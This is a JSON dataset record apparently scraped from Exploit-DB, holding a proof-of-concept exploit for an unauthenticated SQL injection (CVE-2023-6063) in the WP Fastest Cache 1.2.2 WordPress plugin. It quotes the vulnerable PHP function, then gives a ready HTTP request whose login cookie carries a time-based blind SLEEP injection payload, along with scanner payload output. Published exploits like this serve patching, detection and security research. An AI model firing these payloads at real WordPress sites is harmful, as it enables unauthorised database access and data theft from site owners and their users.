{"source": "https://www.exploit-db.com/exploits/51835", "vulnName": "WP Fastest Cache 1.2.2 - Unauthenticated SQL Injection", "vulnEDBID": "51835", "vulnCVE": "N/A", "author": "MERYEM TA\u015eKIN", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-28", "vulnContent": "# Exploit Title: Unauthenticated SQL Injection in WP Fastest Cache 1.2.2\n# Date: 14.11.2023\n# Exploit Author: Meryem Ta\u015fk\u0131n\n# Vendor Homepage: https://www.wpfastestcache.com/\n# Software Link: https://wordpress.org/plugins/wp-fastest-cache/\n# Version: WP Fastest Cache 1.2.2\n# Tested on: WP Fastest Cache 1.2.2\n# CVE: CVE-2023-6063\n \n## Description\nAn SQL injection vulnerability exists in version 1.2.2 of the WP Fastest Cache plugin, allowing an attacker to trigger SQL queries on the system without authentication.\n \n## Vuln Code\n \npublic function is_user_admin(){\n            global $wpdb;\n            foreach ((array)$_COOKIE as $cookie_key => $cookie_value){\n                if(preg_match(\"/wordpress_logged_in/i\", $cookie_key)){ \n                    $username = preg_replace(\"/^([^\\|]+)\\|.+/\", \"$1\", $cookie_value); \n                    break;\n                }\n            }\n            if(isset($username) && $username){            \n                $res = $wpdb->get_var(\"SELECT `$wpdb->users`.`ID`, `$wpdb->users`.`user_login`, `$wpdb->usermeta`.`meta_key`, `$wpdb->usermeta`.`meta_value`\n                                       FROM `$wpdb->users`\n                                       INNER JOIN `$wpdb->usermeta`\n                                       ON `$wpdb->users`.`user_login` = \\\"$username\\\" AND  # $username varible is not escaped vulnerable to SQL injection\n                                       .....\n \n## Exploit\nGET / HTTP/1.1\nCookie: wordpress_logged_in_1=%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29A%29%20AND%20%221%22%3D%221\nHost: meryem.local\n \n## Parameter: Cookie #1* ((custom) HEADER)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: wordpress_logged_in_dsadasdasd=\" AND (SELECT 3809 FROM (SELECT(SLEEP(5)))RDVP) AND \"HQDg\"=\"HQDg\n---\n \n## References\n- [WPScan Blog Post](https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/)\n- [WPScan Vulnerability](https://wpscan.com/vulnerability/30a74105-8ade-4198-abe2-1c6f2967443e/)\n- [CVE-2023-6063](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6063)\n \n## Credits\n- Original Researcher: Alex Sanford\n- PoC: Meryem Ta\u015fk\u0131n\n            "}